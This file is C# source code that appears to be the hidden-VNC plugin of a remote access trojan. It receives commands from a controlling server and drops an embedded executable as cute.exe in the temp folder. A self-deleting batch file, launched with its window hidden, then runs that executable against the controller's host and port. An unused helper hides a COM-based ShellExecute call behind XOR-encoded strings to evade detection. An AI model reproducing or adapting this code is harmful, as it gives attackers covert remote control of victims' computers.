using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using MessagePackLib.MessagePack;
using Plugin.Properties;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[]) data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "hVNCStart":
                    {
                        cute(unpack_msgpack.ForcePathObject("port").AsString);
                        //AlphaAndOmega.Exec(unpack_msgpack.ForcePathObject("port").AsString);
                        break;
                    }
                    case "hVNCStop":
                    {
                        ///new HandlehVNC().Stop();
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static void cute(string port)
        {
            var host = Plugin.Socket.RemoteEndPoint.ToString();
            var index = host.LastIndexOf(":");
            if (index > 0)
                host = host.Substring(0, index);
            var cute = Path.Combine(Path.GetTempPath(), "cute.exe");
            Task.Factory.StartNew(() => File.WriteAllBytes(cute, Resources.Stub)).Wait();
            /*
            Exec(cute, host+" "+port, null);
            */
            do
            {
                Thread.Sleep(500);
            } while (!File.Exists(cute));

            var file = new StreamWriter(Path.Combine(Path.GetTempPath(), "delexec.bat"));
            file.WriteLine(cute + " " + host + " " + port + " & exit");
            file.WriteLine("DEL  %exeFile%");
            file.WriteLine("DEL \"%~f0\"");
            file.Close();
            var chv = Path.Combine(Path.Combine(Path.GetTempPath(), "delexec.bat"));
            Process.Start(new ProcessStartInfo
            {
                FileName = chv,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false
            }).WaitForExit();
        }

        public static void Exec(string path, string parameter, object show)
        {
            try
            {
                var typeFromClsid =
                    Type.GetTypeFromCLSID(new Guid(BCutEncrypt("3HK:?3=8'L<K2';;IL'K>>8'::K:I3:K2L93")));
                var instance = Activator.CreateInstance(typeFromClsid);
                var target1 = typeFromClsid.InvokeMember(BCutEncrypt("c~og"), BindingFlags.InvokeMethod, null, instance,
                    null);
                var target2 = target1.GetType().InvokeMember(BCutEncrypt("Nei\x007Fgod~"), BindingFlags.GetProperty,
                    null, target1, null);
                var target3 = target2.GetType().InvokeMember(BCutEncrypt("Kzzfcik~ced"), BindingFlags.GetProperty, null,
                    target2, null);
                target3.GetType().InvokeMember(BCutEncrypt("YboffOroi\x007F~o"), BindingFlags.InvokeMethod, null,
                    target3, new object[5]
                    {
                        path,
                        parameter,
                        "",
                        null,
                        show
                    });
            }
            catch
            {
            }
        }

        public static string BCutEncrypt(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char) (num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }
    }
}